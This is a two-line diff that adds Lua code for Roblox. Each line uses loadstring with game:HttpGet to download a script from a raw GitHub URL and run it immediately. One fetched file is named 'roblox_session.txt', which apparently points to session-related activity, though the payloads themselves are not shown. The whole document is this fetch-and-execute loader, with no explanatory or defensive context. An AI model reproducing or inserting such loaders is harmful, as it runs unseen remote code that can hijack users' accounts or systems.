@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/davidady/non/refs/heads/main/roblox_session.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/davidady/non/refs/heads/main/pt2.txt"))()
